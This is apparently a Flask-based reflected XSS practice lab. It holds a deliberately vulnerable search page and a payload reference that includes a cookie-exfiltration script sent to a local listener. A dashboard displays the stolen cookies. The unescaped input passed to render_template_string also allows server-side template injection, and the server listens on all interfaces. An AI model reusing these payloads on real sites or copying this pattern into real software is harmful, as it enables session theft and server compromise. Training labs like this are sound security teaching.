import os
import sys
import time
import webbrowser
from threading import Timer
from flask import Flask, request, render_template_string

# --- MULTI-OS COMPATIBILITY SETUP ---
def clear_terminal():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

clear_terminal()

# --- TERMINAL ANSI BANNERS (STRICT DEEP BLUE ONLY) ---
banner_1 = "\033[1;34m" + r"""
██╗     ██╗  ██╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗
██║     ██║ ██╔╝     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝
██║     █████╔╝█████╗███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗
██║     ██╔═██╗╚════╝██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║
███████╗██║  ██╗     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████╗
╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝""" + "\033[0m"

banner_2 = "\033[1;34m" + r"""
██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗██████╗  █████╗ ██████╗ ██╗     ███████╗    ██╗    ██╗███████╗██████╗ 
██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝    ██║    ██║██╔════╝██╔══██╗
██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██████╔╝███████║██████╔╝██║     █████╗      ██║ █╗ ██║█████╗  ██████╔╝
╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║██╔══██╗██║     ██╔══╝      ██║███╗██║██╔══╝  ██╔══██╗
 ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║██████╔╝███████╗███████╗    ╚███╔███╔╝███████╗██████╔╝
  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝     ╚══╝╚══╝ ╚══════╝╚═════╝""" + "\033[0m"

def display_interface():
    print(banner_1)
    time.sleep(0.3) 
    print("\n" + "-"*90 + "\n")
    print(banner_2)
    print("\n\033[1;37m[+] LK - HACKERS Engine Initialized Successfully...\033[0m")
    print("\033[1;33m[*] Local Server URL: http://127.0.0.1:8080\033[0m")
    print("\033[1;32m[*] Network Server URL: http://192.168.8.195:8080\033[0m\n")

display_interface()

# --- FLASK APPLICATION LOGIC ---
app = Flask(__name__)
STOLEN_DATA = []

# --- FIXED UNIVERSAL HTML STRUCT ---
HTML_HEAD = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LK - HACKERS | Gray Hat Lab v1.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=400;500;600;700&family=JetBrains+Mono:wght=400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-light: #f8fafc;
            --text-dark: #0f172a;
            --primary-blue: #2563eb;
            --hacker-green: #00ff66;
            --hacker-bg: #0a0f1d;
            --danger-red: #f43f5e;
            --neon-glow: 0 0 15px rgba(0, 255, 102, 0.4);
            --neon-red-glow: 0 0 15px rgba(244, 63, 94, 0.4);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; transition: 0.3s; background-color: var(--bg-light); color: var(--text-dark); }
        
        nav { padding: 18px 6%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 20px rgba(0,0,0,0.03); background: #ffffff; border-bottom: 1px solid #e2e8f0; }
        .logo { font-size: 22px; font-weight: 700; text-decoration: none; display: flex; align-items: center; gap: 8px; color: var(--primary-blue); }
        .nav-links { display: flex; align-items: center; gap: 15px; }
        .nav-links a { text-decoration: none; font-weight: 600; font-size: 15px; color: #475569; }
        
        .btn { padding: 8px 16px; border-radius: 8px; font-weight: 600; text-decoration: none; border: none; cursor: pointer; font-size: 14px; }
        .panel-btn { background: #ffe4e6; color: var(--danger-red) !important; border: 1px solid #fecaca; }
        .help-btn { background: #dbeafe; color: #1e40af; border: 1px solid #bfdbfe; margin-right: 10px; }

        .container { max-width: 1200px; margin: 40px auto; padding: 0 24px; }
        .vuln-output { background: #ffe4e6; border-left: 5px solid var(--danger-red); padding: 18px; margin-bottom: 35px; border-radius: 6px; font-size: 16px; color: #b91c1c; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 30px; margin-top: 25px; }
        .product-card { background: white; border-radius: 12px; border: 1px solid #e2e8f0; padding: 20px; }
        .buy-action { width: 100%; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; margin-top: 15px; background: var(--primary-blue); }

        /* Hacker Panel Themes */
        .hacker-body { background-color: var(--hacker-bg) !important; color: #cbd5e1 !important; }
        .hacker-nav { background: #111827 !important; border-bottom: 1px solid #1f2937 !important; }
        .hacker-nav .logo { color: var(--hacker-green) !important; text-shadow: var(--neon-glow); }
        .hacker-nav .nav-links a { color: #9ca3af !important; }
        .hacker-title { font-family: 'JetBrains Mono', monospace; color: var(--danger-red); text-shadow: var(--neon-red-glow); margin-bottom: 20px; font-size: 32px; font-weight: 700; text-align: center; }
        .log-container { background: #090d16; border: 2px solid #1f2937; border-radius: 12px; padding: 30px; }
        .dump-box { background: #05070c; color: #38bdf8; padding: 14px; border-radius: 6px; border: 1px solid #1e293b; overflow-x: auto; font-size: 14px; margin-top: 10px; }

        /* Help Overlay Styling */
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px; }
        .overlay-content { background: #0f172a; border: 2px solid #1e40af; border-radius: 16px; max-width: 750px; width: 100%; padding: 35px; color: #f1f5f9; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); font-family: 'Plus Jakarta Sans', sans-serif; position: relative; max-height: 90vh; overflow-y: auto; }
        .overlay-title { font-family: 'JetBrains Mono', monospace; font-size: 24px; color: #38bdf8; border-bottom: 1px solid #334155; padding-bottom: 15px; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
        .close-btn { position: absolute; top: 20px; right: 25px; background: transparent; border: none; color: #94a3b8; font-size: 28px; cursor: pointer; }
        .close-btn:hover { color: #f43f5e; }
        .vector-section { background: #1e293b; border-radius: 8px; padding: 15px; margin-bottom: 15px; border-left: 4px solid #2563eb; }
        .vector-title { font-weight: 700; color: #f8fafc; font-size: 15px; margin-bottom: 6px; font-family: 'JetBrains Mono', monospace; }
        .vector-desc { color: #94a3b8; font-size: 14px; margin-bottom: 8px; line-height: 1.4; }
        .code-snippet { background: #020617; padding: 8px 12px; border-radius: 6px; color: #34d399; font-family: 'JetBrains Mono', monospace; font-size: 13px; display: block; border: 1px solid #1e293b; }
    </style>
</head>
<body>
"""

def get_navbar(is_hacker=False):
    nav_style = "class='hacker-nav'" if is_hacker else ""
    return f"""
    <nav id="mainNav" {nav_style}>
        <a href="/" class="logo">⚡ LK - HACKERS LAB</a>
        <div class="nav-links">
            <button onclick="toggleHelp()" class="btn help-btn">💡 Attack Reference</button>
            <a href="/" style="margin-right: 10px;">Target Website</a>
            <a href="/hacker-panel" class="btn panel-btn">💀 Hacker Dashboard</a>
        </div>
    </nav>
    """

HELP_OVERLAY = """
<div id="helpOverlay" class="overlay">
    <div class="overlay-content">
        <button class="close-btn" onclick="toggleHelp()">&times;</button>
        <div class="overlay-title">🛡️ LK-HACKERS Lab Vector Guide</div>
        
        <div class="vector-section" style="border-left-color: #3b82f6;">
            <div class="vector-title">1. Basic Alert Box Execution</div>
            <div class="vector-desc">Verifies standard input handling reflection by forcing the browser engine to evaluate code structures natively.</div>
            <span class="code-snippet">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
        </div>

        <div class="vector-section" style="border-left-color: #a855f7;">
            <div class="vector-title">2. HTML Element Event Trigger Injection</div>
            <div class="vector-desc">Utilizes element attributes to run scripts inline without requiring standard structural tags. Useful for checking parsing rule exceptions.</div>
            <span class="code-snippet">&lt;img src=x onerror=alert(1)&gt;</span>
        </div>

        <div class="vector-section" style="border-left-color: #10b981;">
            <div class="vector-title">3. Session Exfiltration Payload</div>
            <div class="vector-desc">Simulates a validation environment check. It extracts cookie storage contexts out to the server listening hub endpoint.</div>
            <span class="code-snippet">&lt;script&gt;fetch('http://127.0.0.1:8080/exfiltrate?cookie=' + document.cookie);&lt;/script&gt;</span>
        </div>

        <div class="vector-section" style="border-left-color: #f59e0b;">
            <div class="vector-title">4. Document Object Model Redirection</div>
            <div class="vector-desc">Tests how client-side runtime parameters handle immediate modifications to location properties.</div>
            <span class="code-snippet">&lt;script&gt;window.location='http://127.0.0.1:8080/hacker-panel';&lt;/script&gt;</span>
        </div>
    </div>
</div>
<script>
    function toggleHelp() {
        var overlay = document.getElementById('helpOverlay');
        if (overlay.style.display === 'flex') {
            overlay.style.display = 'none';
        } else {
            overlay.style.display = 'flex';
        }
    }
</script>
"""

# 1. TARGET WEBSITE VIEW
@app.route('/', methods=['GET'])
def home_store():
    search_query = request.args.get('search', '')
    vuln_box = ""
    if search_query:
        vuln_box = f"""
        <div class="vuln-output">
            <p>Search Results for: <span>{search_query}</span></p>
        </div>
        """

    content = f"""
    {HTML_HEAD}
    {get_navbar(is_hacker=False)}
    <div style="background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); color: white; padding: 70px 6%; text-align: center;">
        <h1>LK - HACKERS WEB ATTACK LAB</h1>
        <p>A completely stable testing environment for Reflected XSS (Cross-Site Scripting).</p>
        <form method="GET" action="/" style="margin-top: 30px; display: flex; justify-content: center;">
            <input type="text" name="search" style="width: 55%; padding: 14px 24px; border: none; border-radius: 10px 0 0 10px; font-size: 16px; outline: none;" placeholder="Search products (e.g. laptop, xss injection)..." value="{search_query}">
            <button type="submit" style="background: #0f172a; color: white; border: none; padding: 0 30px; border-radius: 0 10px 10px 0; cursor: pointer; font-weight: 600;">Search</button>
        </form>
    </div>

    <div class="container">
        {vuln_box}
        <h2 style="font-size: 24px; margin-bottom: 20px;">Trending Gear</h2>
        <div class="grid">
            <div class="product-card">
                <h3>QuantumBook Pro 16</h3>
                <p style="color: #64748b; font-size: 14px; margin-top: 6px;">Next-gen M4 architecture laptop.</p>
                <div style="font-weight:700; margin-top:10px; color:#2563eb;">$1,499</div>
                <button class="buy-action">Purchase Item</button>
            </div>
            <div class="product-card">
                <h3>Z-Phone Flip Carbon</h3>
                <p style="color: #64748b; font-size: 14px; margin-top: 6px;">Foldable display with dynamic hinge tech.</p>
                <div style="font-weight:700; margin-top:10px; color:#2563eb;">$1,099</div>
                <button class="buy-action">Purchase Item</button>
            </div>
        </div>
    </div>
    {HELP_OVERLAY}
    </body>
    </html>
    """
    return render_template_string(content)

# 2. EXFILTRATION LISTENER ENDPOINT
@app.route('/exfiltrate', methods=['GET'])
def capture_endpoint():
    intercepted_cookie = request.args.get('cookie', 'No active session cookies extracted.')
    attacker_tool = request.headers.get('User-Agent', 'Generic HTTP Tool/Exploit Script')
    victim_ip = request.remote_addr
    attack_vector = request.args.get('method', 'Reflected XSS (GET)')

    STOLEN_DATA.append({
        "vector": attack_vector,
        "cookie": intercepted_cookie,
        "tool": attacker_tool,
        "ip": victim_ip
    })
    return "Data Intercepted Successfully", 200

# 3. CONTROL CENTER (HACKER DASHBOARD)
@app.route('/hacker-panel')
def control_panel():
    log_blocks = ""
    if not STOLEN_DATA:
        log_blocks = "<p style='color: #64748b; font-family: monospace; text-align: center; padding: 50px;'>[-] Listening on 0.0.0.0:8080... Waiting for incoming exploit payloads.</p>"
    else:
        for log in STOLEN_DATA:
            log_blocks += f'''
            <div style="background: #111827; border-left: 5px solid var(--hacker-green); border: 1px solid #1f2937; padding: 20px; border-radius: 8px; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px;">
                    <span style="background: rgba(0, 255, 102, 0.15); color: var(--hacker-green); padding: 5px 12px; border-radius: 6px; border: 1px solid var(--hacker-green); font-weight: bold;">[+] ATTACK: {log['vector']}</span>
                    <span><b>VICTIM IP:</b> {log['ip']}</span>
                </div>
                <p style="font-size: 14px; margin-bottom: 5px; color: #94a3b8;"><b>User-Agent:</b> {log['tool']}</p>
                <div class="dump-box">
                    <strong>[EXFILTRATED DATA POOL]:</strong><br>
                    {log['cookie']}
                </div>
            </div>
            '''

    content = f"""
    {HTML_HEAD}
    <script>document.body.classList.add('hacker-body');</script>
    {get_navbar(is_hacker=True)}
    <div class="container">
        <h1 class="hacker-title">☠️ LK - HACKERS GRAY-HAT MONITOR</h1>
        <p style="color: #64748b; font-family: monospace; text-align: center; margin-bottom: 30px;">Real-time Interception Terminal Logs & Session Monitor</p>
        
        <div class="log-container">
            <h3 style="color: #f8fafc; font-family: 'JetBrains Mono', monospace; margin-bottom: 20px; border-bottom: 1px solid #1f2937; padding-bottom: 10px;">[ Incoming Log Stream ]</h3>
            {log_blocks}
        </div>
    </div>
    {HELP_OVERLAY}
    </body>
    </html>
    """
    return render_template_string(content)

# --- PROCESS AUTOMATION ---
def open_browser():
    try:
        if 'com.termux' not in sys.executable and 'ANDROID_ROOT' not in os.environ:
            webbrowser.open("http://127.0.0.1:8080")
    except Exception:
        pass

if __name__ == '__main__':
    Timer(1.5, open_browser).start()
    app.run(host='0.0.0.0', port=8080, debug=False)
